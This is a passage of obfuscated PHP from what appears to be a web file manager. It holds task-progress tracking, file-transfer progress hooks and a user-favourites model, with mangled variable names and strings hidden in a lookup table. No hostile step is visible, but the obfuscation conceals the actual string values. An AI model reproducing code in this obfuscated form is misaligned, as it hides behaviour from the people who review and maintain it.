Hook::unbind($Ñ¤Êñ¶»[1715], array($this, $Ñ¤Êñ¶»[1771])); Hook::unbind($Ñ¤Êñ¶»[1772], array($this, $Ñ¤Êñ¶»[1773])); $this->endAfter(); $°„ºŠ®á = $this->task; $this->task = !1; Hook::trigger($Ñ¤Êñ¶»[1778], $°„ºŠ®á); } public function update($¢ìÓØ³ = 0, $ÇòºµŸ = false) { $Ø•ùË¯ş =& $_SERVER[è¶³ÒßÑ]; $Ë™Ûş­ =& $this->task; if (!$Ë™Ûş­) { return; } $Ë™Ûş­[$Ø•ùË¯ş[1762]] += $¢ìÓØ³; $Ë™Ûş­[$Ø•ùË¯ş[1766]] = timeFloat(); if ($Ë™Ûş­[$Ø•ùË¯ş[1116]]) { if ($Ë™Ûş­[$Ø•ùË¯ş[1116]] < $Ë™Ûş­[$Ø•ùË¯ş[1762]]) { $Ë™Ûş­[$Ø•ùË¯ş[1116]] = $Ë™Ûş­[$Ø•ùË¯ş[1762]]; } $ØÂ®ÕïŞ = timeFloat() - $Ë™Ûş­[$Ø•ùË¯ş[1765]] - $Ë™Ûş­[$Ø•ùË¯ş[1768]]; if ($ØÂ®ÕïŞ <= 0) { $ØÂ®ÕïŞ = 0.001; } $Ë™Ûş­[$Ø•ùË¯ş[1763]] = $Ë™Ûş­[$Ø•ùË¯ş[1762]] / $Ë™Ûş­[$Ø•ùË¯ş[1116]]; $Ë™Ûş­[$Ø•ùË¯ş[1764]] = $Ë™Ûş­[$Ø•ùË¯ş[1762]] / $ØÂ®ÕïŞ; if ($Ë™Ûş­[$Ø•ùË¯ş[1763]] > 0) { $Ë™Ûş­[$Ø•ùË¯ş[1769]] = $ØÂ®ÕïŞ * (1 - $Ë™Ûş­[$Ø•ùË¯ş[1763]]) / $Ë™Ûş­[$Ø•ùË¯ş[1763]]; } $Ë™Ûş­[$Ø•ùË¯ş[1769]] = $Ë™Ûş­[$Ø•ùË¯ş[1769]] <= 0 ? 0 : $Ë™Ûş­[$Ø•ùË¯ş[1769]]; } $this->updateAfter(); $î¡¾‘ú¤ = 0.2; if (timeFloat() - $Ë™Ûş­[$Ø•ùË¯ş[1767]] < $î¡¾‘ú¤ && !$ÇòºµŸ) { return; } $ì¡ÆººÀ = self::get($Ë™Ûş­[$Ø•ùË¯ş[468]]); $ÈúÌÊÓ’ = $ì¡ÆººÀ[$Ø•ùË¯ş[804]]; if ($ÈúÌÊÓ’ == self::STATYS_KILL) { $øÚÙ»‰ó = array($Ø•ùË¯ş[1779] => LNG($Ø•ùË¯ş[1780]), $Ø•ùË¯ş[1272] => !1); Cache::set($Ø•ùË¯ş[1781] . $this->task[$Ø•ùË¯ş[468]], $øÚÙ»‰ó, 30); $this->onKill(); $this->end(); die; } else { if ($ÈúÌÊÓ’ == self::STATYS_STOP) { $üË‘¼î = 2; $ì¡ÆººÀ[$Ø•ùË¯ş[1768]] += $üË‘¼î; self::valueSet($Ë™Ûş­[$Ø•ùË¯ş[468]], $ì¡ÆººÀ); sleep($üË‘¼î); $this->update(); return; } } $Ë™Ûş­[$Ø•ùË¯ş[804]] = $ÈúÌÊÓ’ ? $ÈúÌÊÓ’ : $Ë™Ûş­[$Ø•ùË¯ş[804]]; $Ë™Ûş­[$Ø•ùË¯ş[1768]] = $ì¡ÆººÀ[$Ø•ùË¯ş[1768]] ? $ì¡ÆººÀ[$Ø•ùË¯ş[1768]] : 0; $Ë™Ûş­[$Ø•ùË¯ş[1767]] = timeFloat(); Hook::trigger($Ø•ùË¯ş[1782], $Ë™Ûş­); self::valueSet($Ë™Ûş­[$Ø•ùË¯ş[468]], $Ë™Ûş­); } public function onKillSet($¿ÊÄÇƒ™, $ŸÌÄßº‡ = array()) { $this->onKillCall = array($¿ÊÄÇƒ™, $ŸÌÄßº‡); } public function onKill() { $ëíŠ˜…¬ =& $_SERVER[è¶³ÒßÑ]; self::log($ëíŠ˜…¬[1775] . $this->task[$ëíŠ˜…¬[468]] . $ëíŠ˜…¬[1783]); Hook::trigger($ëíŠ˜…¬[1784], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($øª¬ì‰æ) { $ôñ’»º =& $_SERVER[è¶³ÒßÑ]; Cache::set($ôñ’»º[1781] . $this->task[$ôñ’»º[468]], $øª¬ì‰æ, 60); return $øª¬ì‰æ; } public static function get($®«ÀËÁ) { $¸Ì¥èÔ =& $_SERVER[è¶³ÒßÑ]; $Ü¬‡ÕĞÁ = self::valueGet($®«ÀËÁ); if (is_array($Ü¬‡ÕĞÁ) && $Ü¬‡ÕĞÁ[$¸Ì¥èÔ[1785]]) { $×óüÎ¬ = ActionApply($Ü¬‡ÕĞÁ[$¸Ì¥èÔ[1785]], array($Ü¬‡ÕĞÁ)); $Ü¬‡ÕĞÁ = is_array($×óüÎ¬) ? $×óüÎ¬ : $Ü¬‡ÕĞÁ; } return $Ü¬‡ÕĞÁ; } public static function listData() { $ºšŠùœ’ = self::valueGet(); return array_sort_by($ºšŠùœ’, $_SERVER[è¶³ÒßÑ][1765], !0); } public static function kill($Ä°´€ê×) { return self::changeStatus($Ä°´€ê×, self::STATYS_KILL); } public static function stop($Ë‚ø¼ıî) { return self::changeStatus($Ë‚ø¼ıî, self::STATYS_STOP); } public static function restart($È“ôã«Ã) { return self::changeStatus($È“ôã«Ã, self::STATYS_RUNNING); } public static function killAll() { $ÈÄ¯©²ö =& $_SERVER[è¶³ÒßÑ]; $±—‘«îœ = self::listData(); foreach ($±—‘«îœ as $•ß©†Ì ) { self::kill($•ß©†Ì [$ÈÄ¯©²ö[468]]); } sleep(2); foreach ($±—‘«îœ as $•ß©†Ì ) { self::valueSet($•ß©†Ì [$ÈÄ¯©²ö[468]], !1); } } private static function changeStatus($¬¦À‡æª, $¬† ÷š) { $áÀœÚœ =& $_SERVER[è¶³ÒßÑ]; $îãóúñœ = self::valueGet($¬¦À‡æª); if (!$îãóúñœ) { return !1; } $îãóúñœ[$áÀœÚœ[804]] = $¬† ÷š; self::valueSet($¬¦À‡æª, $îãóúñœ); self::log($áÀœÚœ[1786] . $îãóúñœ[$áÀœÚœ[468]] . $áÀœÚœ[1787] . $¬† ÷š); return !0; } public static function valueGet($ìíŠéöÃ = false) { $¢·´®ºİ =& $_SERVER[è¶³ÒßÑ]; if ($ìíŠéöÃ) { $Ê¦›œã¹ = Model($¢·´®ºİ[513])->where(array($¢·´®ºİ[107] => $ìíŠéöÃ, $¢·´®ºİ[33] => $¢·´®ºİ[1125]))->find(); return $Ê¦›œã¹ ? json_decode($Ê¦›œã¹[$¢·´®ºİ[443]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ÀÌè€»× = false) { $éæÁæİ =& $_SERVER[è¶³ÒßÑ]; $‘®¿§° = array($éæÁæİ[33] => $éæÁæİ[1125]); if ($ÀÌè€»×) { $‘®¿§°[$éæÁæİ[1761]] = $ÀÌè€»×; } $ì¶»ÜĞ‘ = Model($éæÁæİ[513])->where($‘®¿§°)->select(); $ì¶»ÜĞ‘ = $ì¶»ÜĞ‘ ? $ì¶»ÜĞ‘ : array(); foreach ($ì¶»ÜĞ‘ as $´¸ÇĞà¯ => $İœ¸…îå) { $ì¶»ÜĞ‘[$´¸ÇĞà¯] = json_decode($İœ¸…îå[$éæÁæİ[443]], !0); } return $ì¶»ÜĞ‘; } public static function valueSet($úÅ¹·‡¨, $¿ãÅ»ó¦) { $´ŸÆ³è =& $_SERVER[è¶³ÒßÑ]; if (!$¿ãÅ»ó¦) { return Model($´ŸÆ³è[513])->where(array($´ŸÆ³è[107] => $úÅ¹·‡¨, $´ŸÆ³è[33] => $´ŸÆ³è[1125]))->delete(); } $æ”ğ°ë = json_encode($¿ãÅ»ó¦); if (!$æ”ğ°ë) { ob_start(); var_dump($¿ãÅ»ó¦); $Œ ¸‘ = ob_get_clean(); self::log($´ŸÆ³è[1788] . json_encode_force($Œ ¸‘)); } if (!$úÅ¹·‡¨ || !$¿ãÅ»ó¦[$´ŸÆ³è[468]]) { return !1; } $¾òùê¨ = array($´ŸÆ³è[33] => $´ŸÆ³è[1125], $´ŸÆ³è[1761] => USER_ID, $´ŸÆ³è[107] => $úÅ¹·‡¨, $´ŸÆ³è[443] => $æ”ğ°ë); $›×Ş¸Â¬ = $´ŸÆ³è[1789]; CacheLock::lock($›×Ş¸Â¬); Model($´ŸÆ³è[513])->add($¾òùê¨, array(), !0); CacheLock::unlock($›×Ş¸Â¬); } public static function log($¹èšÃøú) { if (!GLOBAL_DEBUG) { return; } write_log($¹èšÃøú, $_SERVER[è¶³ÒßÑ][1790]); } } class TaskFileTransfer extends Task { protected function startAfter() { $õÅÙë²ª =& $_SERVER[è¶³ÒßÑ]; $À…ìˆò =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($õÅÙë²ª[1791], array($this, $õÅÙë²ª[1792])); Hook::bind($õÅÙë²ª[1283], array($this, $õÅÙë²ª[1793])); Hook::bind($õÅÙë²ª[1794], array($this, $õÅÙë²ª[1795])); Hook::bind($õÅÙë²ª[661], array($this, $õÅÙë²ª[1796])); Hook::bind($õÅÙë²ª[662], array($this, $õÅÙë²ª[1797])); Hook::bind($õÅÙë²ª[668], array($this, $õÅÙë²ª[1798])); Hook::bind($õÅÙë²ª[669], array($this, $õÅÙë²ª[1799])); Hook::bind($õÅÙë²ª[664], array($this, $õÅÙë²ª[1800])); Hook::bind($õÅÙë²ª[666], array($this, $õÅÙë²ª[1801])); Hook::bind($õÅÙë²ª[630], array($this, $õÅÙë²ª[1802])); Hook::bind($õÅÙë²ª[627], array($this, $õÅÙë²ª[1802])); Hook::bind($õÅÙë²ª[632], array($this, $õÅÙë²ª[1802])); Hook::bind($õÅÙë²ª[634], array($this, $õÅÙë²ª[1802])); Hook::bind($õÅÙë²ª[636], array($this, $õÅÙë²ª[1802])); Hook::bind($õÅÙë²ª[1803], array($this, $õÅÙë²ª[1804])); Hook::bind($õÅÙë²ª[652], array($this, $õÅÙë²ª[1805])); $this->sourceModelCopyFlag = !1; Hook::bind($õÅÙë²ª[1806], array($this, $õÅÙë²ª[1807])); Hook::bind($õÅÙë²ª[1808], array($this, $õÅÙë²ª[1809])); Hook::bind($õÅÙë²ª[1810], array($this, $õÅÙë²ª[1811])); $À…ìˆò[$õÅÙë²ª[1812]] = LNG($õÅÙë²ª[1813]); $À…ìˆò[$õÅÙë²ª[1814]] = 0; $À…ìˆò[$õÅÙë²ª[1815]] = 0; $À…ìˆò[$õÅÙë²ª[1118]] = $õÅÙë²ª[12]; $À…ìˆò[$õÅÙë²ª[1816]] = $õÅÙë²ª[12]; $À…ìˆò[$õÅÙë²ª[1817]] = 0; $À…ìˆò[$õÅÙë²ª[1818]] = 0; $À…ìˆò[$õÅÙë²ª[1819]] = 0; if (!$À…ìˆò[$õÅÙë²ª[1650]]) { $À…ìˆò[$õÅÙë²ª[1650]] = LNG($õÅÙë²ª[1820]); } } protected function endAfter() { $†ß¼Âªå =& $_SERVER[è¶³ÒßÑ]; Hook::unbind($†ß¼Âªå[1791], array($this, $†ß¼Âªå[1792])); Hook::unbind($†ß¼Âªå[1283], array($this, $†ß¼Âªå[1793])); Hook::unbind($†ß¼Âªå[1794], array($this, $†ß¼Âªå[1795])); Hook::unbind($†ß¼Âªå[661], array($this, $†ß¼Âªå[1796])); Hook::unbind($†ß¼Âªå[662], array($this, $†ß¼Âªå[1797])); Hook::unbind($†ß¼Âªå[668], array($this, $†ß¼Âªå[1798])); Hook::unbind($†ß¼Âªå[669], array($this, $†ß¼Âªå[1799])); Hook::unbind($†ß¼Âªå[664], array($this, $†ß¼Âªå[1800])); Hook::unbind($†ß¼Âªå[666], array($this, $†ß¼Âªå[1801])); Hook::unbind($†ß¼Âªå[630], array($this, $†ß¼Âªå[1802])); Hook::unbind($†ß¼Âªå[627], array($this, $†ß¼Âªå[1802])); Hook::unbind($†ß¼Âªå[632], array($this, $†ß¼Âªå[1802])); Hook::unbind($†ß¼Âªå[634], array($this, $†ß¼Âªå[1802])); Hook::unbind($†ß¼Âªå[636], array($this, $†ß¼Âªå[1802])); Hook::unbind($†ß¼Âªå[1803], array($this, $†ß¼Âªå[1804])); Hook::unbind($†ß¼Âªå[652], array($this, $†ß¼Âªå[1805])); Hook::unbind($†ß¼Âªå[1806], array($this, $†ß¼Âªå[1807])); Hook::unbind($†ß¼Âªå[1808], array($this, $†ß¼Âªå[1809])); Hook::unbind($†ß¼Âªå[1810], array($this, $†ß¼Âªå[1811])); } public function copyMoveStart($óĞ¹ªü, $·øØğÛ, $ûœæÌ÷³, $ù–«¨”í) { $¿ÍÆÑÆÆ =& $_SERVER[è¶³ÒßÑ]; self::log($¿ÍÆÑÆÆ[1821] . $·øØğÛ . $¿ÍÆÑÆÆ[83] . $ù–«¨”í); $€¾² Éó = rtrim(TEMP_FILES, $¿ÍÆÑÆÆ[8]); if (substr($·øØğÛ, 0, strlen($€¾² Éó)) == $€¾² Éó) { return; } if (substr($ù–«¨”í, 0, strlen($€¾² Éó)) == $€¾² Éó) { return; } $‡âáÍ¤Ğ =& $this->task; $‡âáÍ¤Ğ[$¿ÍÆÑÆÆ[1822]] = KodIO::transferType($óĞ¹ªü, $ûœæÌ÷³); $this->update(); } public function updateAfter() { $ÆÀÀÃÜÆ =& $_SERVER[è¶³ÒßÑ]; $¥‹›…­ß =& $this->task; if (!$¥‹›…­ß[$ÆÀÀÃÜÆ[817]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¥‹›…­ß[$ÆÀÀÃÜÆ[1822]] == $ÆÀÀÃÜÆ[1376]) { return; } self::updateTask($¥‹›…­ß); } private static function updateTask(&$ï¡¤Èòİ) { $…Ñªèú =& $_SERVER[è¶³ÒßÑ]; if ($ï¡¤Èòİ[$…Ñªèú[1822]] == $…Ñªèú[1254] || $ï¡¤Èòİ[$…Ñªèú[1822]] == $…Ñªèú[120]) { if ($ï¡¤Èòİ[$…Ñªèú[1816]]) { $ï¡¤Èòİ[$…Ñªèú[1819]] = $ï¡¤Èòİ[$…Ñªèú[1818]] + $ï¡¤Èòİ[$…Ñªèú[1815]]; } } else { if ($ï¡¤Èòİ[$…Ñªèú[1822]] == $…Ñªèú[1377]) { if ($ï¡¤Èòİ[$…Ñªèú[1816]] == $…Ñªèú[1254]) { $ï¡¤Èòİ[$…Ñªèú[1819]] = $ï¡¤Èòİ[$…Ñªèú[1818]] + $ï¡¤Èòİ[$…Ñªèú[1815]] * 0.5; } else { if ($ï¡¤Èòİ[$…Ñªèú[1816]] == $…Ñªèú[120]) { $ï¡¤Èòİ[$…Ñªèú[1819]] = $ï¡¤Èòİ[$…Ñªèú[1818]] + $ï¡¤Èòİ[$…Ñªèú[1814]] * 0.5 + $ï¡¤Èòİ[$…Ñªèú[1815]] * 0.5; } } } } $ï¡¤Èòİ[$…Ñªèú[1763]] = $ï¡¤Èòİ[$…Ñªèú[1819]] / $ï¡¤Èòİ[$…Ñªèú[817]]; if ($ï¡¤Èòİ[$…Ñªèú[1763]] > 0) { $‰‡¾¼™ì = timeFloat() - $ï¡¤Èòİ[$…Ñªèú[1765]] - $ï¡¤Èòİ[$…Ñªèú[1768]]; $ï¡¤Èòİ[$…Ñªèú[1769]] = $‰‡¾¼™ì * (1 - $ï¡¤Èòİ[$…Ñªèú[1763]]) / $ï¡¤Èòİ[$…Ñªèú[1763]]; } } public function addPath($éúüë€©) { $Äéñòñ³ =& $_SERVER[è¶³ÒßÑ]; if (!$éúüë€©) { return; } $İÜƒÖ¡Ä =& $this->task; $‹Øì£Ë = IO::infoWithChildren($éúüë€©); $„®’Ú´Ï = $İÜƒÖ¡Ä[$Äéñòñ³[1823]] ? $İÜƒÖ¡Ä[$Äéñòñ³[1823]][$Äéñòñ³[1824]] : 0; $İÜƒÖ¡Ä[$Äéñòñ³[1823]] = array($Äéñòñ³[1824] => $„®’Ú´Ï + 1, $Äéñòñ³[487] => $‹Øì£Ë[$Äéñòñ³[32]], $Äéñòñ³[97] => $‹Øì£Ë[$Äéñòñ³[97]], $Äéñòñ³[575] => $‹Øì£Ë[$Äéñòñ³[575]] ? $‹Øì£Ë[$Äéñòñ³[575]] : $‹Øì£Ë[$Äéñòñ³[97]]); if ($‹Øì£Ë[$Äéñòñ³[33]] == $Äéñòñ³[240]) { $İÜƒÖ¡Ä[$Äéñòñ³[1116]] += 1; } else { $İÜƒÖ¡Ä[$Äéñòñ³[1116]] += $‹Øì£Ë[$Äéñòñ³[92]][$Äéñòñ³[90]]; if ($‹Øì£Ë[$Äéñòñ³[203]]) { $İÜƒÖ¡Ä[$Äéñòñ³[1116]] += $‹Øì£Ë[$Äéñòñ³[92]][$Äéñòñ³[91]] + 1; } } $İÜƒÖ¡Ä[$Äéñòñ³[817]] += $‹Øì£Ë[$Äéñòñ³[89]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Æ•›‰Œ) { } public function sourceAddHashEnd($ßıİ·) { } public function sourceAddFileStart($ˆİ·ˆœ‚) { $ş´ÁÂò› =& $_SERVER[è¶³ÒßÑ]; $åßïÂ§” =& $this->task; $åßïÂ§”[$ş´ÁÂò›[1814]] = $ˆİ·ˆœ‚[$ş´ÁÂò›[89]]; $åßïÂ§”[$ş´ÁÂò›[1812]] = $ˆİ·ˆœ‚[$ş´ÁÂò›[32]]; $åßïÂ§”[$ş´ÁÂò›[1118]] = $ˆİ·ˆœ‚[$ş´ÁÂò›[32]]; $åßïÂ§”[$ş´ÁÂò›[1825]] = $ˆİ·ˆœ‚[$ş´ÁÂò›[97]]; $this->update(); } public function sourceAddFileEnd($¥—çüñÂ) { $‚ÖØ°¢™ =& $_SERVER[è¶³ÒßÑ]; $­Õ•¶ôÌ =& $this->task; $­Õ•¶ôÌ[$‚ÖØ°¢™[1819]] += $¥—çüñÂ[$‚ÖØ°¢™[89]]; $­Õ•¶ôÌ[$‚ÖØ°¢™[1825]] = $¥—çüñÂ[$‚ÖØ°¢™[97]]; $this->update(1); } public function copyFileStart($š—Ş­Ë–, $˜ÆÂÎŒŸ, $­Äğ×œµ, $ÃÅøÃÇö, $“¬æÀÃ’, $æğãê„) { $•ÒŞ´… =& $_SERVER[è¶³ÒßÑ]; $É¾ğñ®ã = $“¬æÀÃ’; if ($É¾ğñ®ã == $GLOBALS[$•ÒŞ´…[1826]]) { $É¾ğñ®ã = $GLOBALS[$•ÒŞ´…[1827]]; } $GLOBALS[$•ÒŞ´…[1827]] = $“¬æÀÃ’; $GLOBALS[$•ÒŞ´…[1826]] = $æğãê„; $ÙŒîÕ› =& $this->task; $ÙŒîÕ›[$•ÒŞ´…[1812]] = $É¾ğñ®ã; $ÙŒîÕ›[$•ÒŞ´…[1814]] = (int) $š—Ş­Ë–->size($˜ÆÂÎŒŸ); $ÙŒîÕ›[$•ÒŞ´…[1815]] = 0; $ÙŒîÕ›[$•ÒŞ´…[1118]] = $•ÒŞ´…[12]; $ÙŒîÕ›[$•ÒŞ´…[1816]] = $•ÒŞ´…[12]; $ÙŒîÕ›[$•ÒŞ´…[1817]] = 0; $õíè¬„ = $ÙŒîÕ›[$•ÒŞ´…[1814]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÙŒîÕ›[$•ÒŞ´…[468]] . $•ÒŞ´…[1828]); if ($õíè¬„ && file_exists(get_path_father($ÃÅøÃÇö))) { Cache::set($ÙŒîÕ›[$•ÒŞ´…[468]] . $•ÒŞ´…[1828], $ÃÅøÃÇö); $ÙŒîÕ›[$•ÒŞ´…[1785]] = array($•ÒŞ´…[1829], $•ÒŞ´…[1830]); } $this->update(0, $õíè¬„); } public static function updateCopyLocalFileSize($ã…Ëâ¼ù) { $Î—¨÷³ =& $_SERVER[è¶³ÒßÑ]; $ñ¤˜öŠŞ = Cache::get($ã…Ëâ¼ù[$Î—¨÷³[468]] . $Î—¨÷³[1828]); if (!$ñ¤˜öŠŞ || !file_exists($ñ¤˜öŠŞ)) { return $ã…Ëâ¼ù; } $ã…Ëâ¼ù[$Î—¨÷³[1815]] = @filesize($ñ¤˜öŠŞ); $ã…Ëâ¼ù[$Î—¨÷³[1819]] += $ã…Ëâ¼ù[$Î—¨÷³[1815]]; self::updateTask($ã…Ëâ¼ù); return $ã…Ëâ¼ù; } public function copyFileEnd($ ±ÎÔ†À, $åğìâêš, $í‹™ ÙÍ, $†‡ë‡ÇÔ, $»¨şñÇÃ, $öÈ‹È¢˜) { $€„˜ˆ›ı =& $_SERVER[è¶³ÒßÑ]; $˜ŸêöĞÚ =& $this->task; $˜ŸêöĞÚ[$€„˜ˆ›ı[1815]] = $˜ŸêöĞÚ[$€„˜ˆ›ı[1814]]; $˜ŸêöĞÚ[$€„˜ˆ›ı[1816]] = $€„˜ˆ›ı[12]; unset($˜ŸêöĞÚ[$€„˜ˆ›ı[1785]]); if ($»¨şñÇÃ == $˜ŸêöĞÚ[$€„˜ˆ›ı[1812]]) { $˜ŸêöĞÚ[$€„˜ˆ›ı[1818]] += $˜ŸêöĞÚ[$€„˜ˆ›ı[1814]]; $˜ŸêöĞÚ[$€„˜ˆ›ı[1819]] = $˜ŸêöĞÚ[$€„˜ˆ›ı[1818]]; $°íÔŒ•Ó = 1; if (isset($˜ŸêöĞÚ[$€„˜ˆ›ı[1825]]) && $˜ŸêöĞÚ[$€„˜ˆ›ı[1825]] == $åğìâêš) { $°íÔŒ•Ó = 0; } $this->update($°íÔŒ•Ó); } else { $this->update(); $˜ŸêöĞÚ[$€„˜ˆ›ı[1815]] = 0; } Cache::remove($˜ŸêöĞÚ[$€„˜ˆ›ı[468]] . $€„˜ˆ›ı[1828]); self::log($€„˜ˆ›ı[1831] . $åğìâêš . $€„˜ˆ›ı[83] . $†‡ë‡ÇÔ . $€„˜ˆ›ı[60] . $»¨şñÇÃ . $€„˜ˆ›ı[1832] . $˜ŸêöĞÚ[$€„˜ˆ›ı[1812]]); } public function updateFileEnd($ñ‡¯ê‹Ú, $„Í¦ğ¹‡) { $ˆõåÃ¬ =& $_SERVER[è¶³ÒßÑ]; $Öé§ˆÚ¥ =& $this->task; $Öé§ˆÚ¥[$ˆõåÃ¬[1812]] = $ñ‡¯ê‹Ú; $Öé§ˆÚ¥[$ˆõåÃ¬[1814]] = $„Í¦ğ¹‡; $Öé§ˆÚ¥[$ˆõåÃ¬[1818]] += $„Í¦ğ¹‡; $Öé§ˆÚ¥[$ˆõåÃ¬[1819]] = $Öé§ˆÚ¥[$ˆõåÃ¬[1818]]; $this->update(1); self::log($ˆõåÃ¬[1833] . $ñ‡¯ê‹Ú); } public function sourceModelCopy($úüÕì¬Ü) { $ÔİĞŒ× =& $_SERVER[è¶³ÒßÑ]; $õĞ˜™Ú = $úüÕì¬Ü[0]; $³ç±±­Ô = $úüÕì¬Ü[1]; $…›ÂäßÖ =& $this->task; $this->sourceModelCopyFlag = !0; $ƒ„šº¢’ = 0; switch ($õĞ˜™Ú) { case $ÔİĞŒ×[628]: $ƒ„šº¢’ = 1; break; case $ÔİĞŒ×[631]: $…›ÂäßÖ[$ÔİĞŒ×[1812]] = $³ç±±­Ô[$ÔİĞŒ×[32]]; break; case $ÔİĞŒ×[633]: $ƒ„šº¢’ = intval($úüÕì¬Ü[$ÔİĞŒ×[449]] * 0.4); break; case $ÔİĞŒ×[635]: $ƒ„šº¢’ = intval($úüÕì¬Ü[$ÔİĞŒ×[449]] * 0.2); break; case $ÔİĞŒ×[637]: $ƒ„šº¢’ = intval($úüÕì¬Ü[$ÔİĞŒ×[449]] * 0.4); break; } $this->update($ƒ„šº¢’); $this->sourceModelCopyFlag = !1; } public function sourceRemove($¸¯ê…ƒ½, $È¬ƒÀ·) { $Ä™ü“Ï¬ =& $_SERVER[è¶³ÒßÑ]; $this->sourceModelCopyFlag = !0; $Ãèç­ÃÛ = 1; if (isset($¸¯ê…ƒ½[$Ä™ü“Ï¬[92]])) { $Ãèç­ÃÛ = $¸¯ê…ƒ½[$Ä™ü“Ï¬[92]][$Ä™ü“Ï¬[90]]; $Ãèç­ÃÛ = $Ãèç­ÃÛ + $¸¯ê…ƒ½[$Ä™ü“Ï¬[92]][$Ä™ü“Ï¬[91]] + 1; } $this->update($Ãèç­ÃÛ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Àµ‰Úı) { $this->sourceRemove($Àµ‰Úı, !1); } public function curlProgress($¿œô’ÀÀ, $ÆÈƒÙé‡, $¡­ãşóï, $ÅÕÙ‘Æ¾, $¯¹ó††­) { $Ç²Û­İî =& $_SERVER[è¶³ÒßÑ]; $µÆç”§Œ =& $this->task; if ($¯¹ó††­ > 0) { $µÆç”§Œ[$Ç²Û­İî[1118]] = $Ç²Û­İî[1834]; $µÆç”§Œ[$Ç²Û­İî[1816]] = $Ç²Û­İî[120]; if ($µÆç”§Œ[$Ç²Û­İî[1814]]) { $µÆç”§Œ[$Ç²Û­İî[1815]] = $¯¹ó††­; } if ($µÆç”§Œ[$Ç²Û­İî[1817]]) { $µÆç”§Œ[$Ç²Û­İî[1815]] = $¯¹ó††­ + $µÆç”§Œ[$Ç²Û­İî[1817]]; } } else { if ($¡­ãşóï > 0) { if ($µÆç”§Œ[$Ç²Û­İî[1814]] == $ÆÈƒÙé‡) { $µÆç”§Œ[$Ç²Û­İî[1815]] = $¡­ãşóï; $µÆç”§Œ[$Ç²Û­İî[1118]] = $Ç²Û­İî[1835]; $µÆç”§Œ[$Ç²Û­İî[1816]] = $Ç²Û­İî[1254]; } } } $this->update(); } public function curlProgressStart($œ¬ËÉ—©) { } public function curlProgressEnd($é•áÊÇ ) { $¸ ³¤–ş =& $_SERVER[è¶³ÒßÑ]; $Ûâ’¾Š˜ =& $this->task; $¡«ò©ôš = curl_getinfo($é•áÊÇ ); $¨Ó¶ÓÙã = $¡«ò©ôš[$¸ ³¤–ş[1836]]; if ($¨Ó¶ÓÙã == -1) { $¨Ó¶ÓÙã = $¡«ò©ôš[$¸ ³¤–ş[1837]]; } if ($Ûâ’¾Š˜[$¸ ³¤–ş[1816]] == $¸ ³¤–ş[120] && $¨Ó¶ÓÙã) { $Ûâ’¾Š˜[$¸ ³¤–ş[1817]] += $¨Ó¶ÓÙã; } $this->update(); } } goto Aã³ƒÙ¼™; eÛÀİ¸©¡: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($ø‡¡˜ı) { $³àË•ß =& $_SERVER[è¶³ÒßÑ]; return array($³àË•ß[2074] => array(USER_ID, $³àË•ß[2435])); } protected function listData() { $·Â¦•ñü =& $_SERVER[è¶³ÒßÑ]; $Ïå£ÓµÔ = array($·Â¦•ñü[1752] => USER_ID, $·Â¦•ñü[550] => 0); $—ôİ°… = $·Â¦•ñü[2436]; $ø…¥®„ó = $this->field($—ôİ°…)->where($Ïå£ÓµÔ)->order($·Â¦•ñü[2437])->select(); return $ø…¥®„ó ? $ø…¥®„ó : array(); } protected function resetCache() { } protected function listView() { $˜É£Ñºå =& $_SERVER[è¶³ÒßÑ]; $£ùñ õç = $this->listData(); $—ŠØ¡Õ = array_filter_by_field($£ùñ õç, $˜É£Ñºå[33], $˜É£Ñºå[483]); $«È†Ûˆ = array_to_keyvalue($—ŠØ¡Õ, $˜É£Ñºå[12], $˜É£Ñºå[97]); if (!$«È†Ûˆ) { return $£ùñ õç; } $åà“É£ = 2000; $µ¡ƒÁŒ¢ = array($˜É£Ñºå[484] => array($˜É£Ñºå[485], $«È†Ûˆ)); $ÑÖé÷¹ = Model($˜É£Ñºå[878])->listSource($µ¡ƒÁŒ¢, $åà“É£); $ÑÖé÷¹ = array_merge($ÑÖé÷¹[$˜É£Ñºå[96]], $ÑÖé÷¹[$˜É£Ñºå[95]]); $ÑÖé÷¹ = array_to_keyvalue($ÑÖé÷¹, $˜É£Ñºå[203]); foreach ($£ùñ õç as $†½áşÓà => $ŸÊÊ®¶…) { $ïÀ›Ö×¸ = $ÑÖé÷¹[$ŸÊÊ®¶…[$˜É£Ñºå[97]]]; $ïÀ›Ö×¸ = $ïÀ›Ö×¸ ? $ïÀ›Ö×¸ : array(); $£ùñ õç[$†½áşÓà] = array_merge($ïÀ›Ö×¸, $ŸÊÊ®¶…); } return $£ùñ õç; } protected function addFav($§Ü±‰Òó, $×íôôƒº = '', $ø‹õŞè– = "\163\x6f\x75\x72\143\145") { $ı¾Ä¹Ñ¤ =& $_SERVER[è¶³ÒßÑ]; $ğ´¦Á„ = array($ı¾Ä¹Ñ¤[1752] => USER_ID, $ı¾Ä¹Ñ¤[550] => 0, $ı¾Ä¹Ñ¤[489] => $ø‹õŞè–, $ı¾Ä¹Ñ¤[488] => $§Ü±‰Òó); if ($this->where($ğ´¦Á„)->find()) { return !1; } $ğ´¦Á„ = array($ı¾Ä¹Ñ¤[1752] => USER_ID, $ı¾Ä¹Ñ¤[550] => 0); $ä­•¡õ = $this->where($ğ´¦Á„)->max($ı¾Ä¹Ñ¤[1983]); if (!$ä­•¡õ) { $ä­•¡õ = 0; } if (!$×íôôƒº && $ø‹õŞè– == $ı¾Ä¹Ñ¤[483]) { $·˜•õƒÃ = Model($ı¾Ä¹Ñ¤[1395])->where(array($ı¾Ä¹Ñ¤[484] => $§Ü±‰Òó))->find(); if (!$·˜•õƒÃ) { return !1; } $×íôôƒº = $·˜•õƒÃ[$ı¾Ä¹Ñ¤[32]]; } $×íôôƒº = $this->getAutoName($×íôôƒº); $Ê¯»½éî = array($ı¾Ä¹Ñ¤[1752] => USER_ID, $ı¾Ä¹Ñ¤[550] => 0, 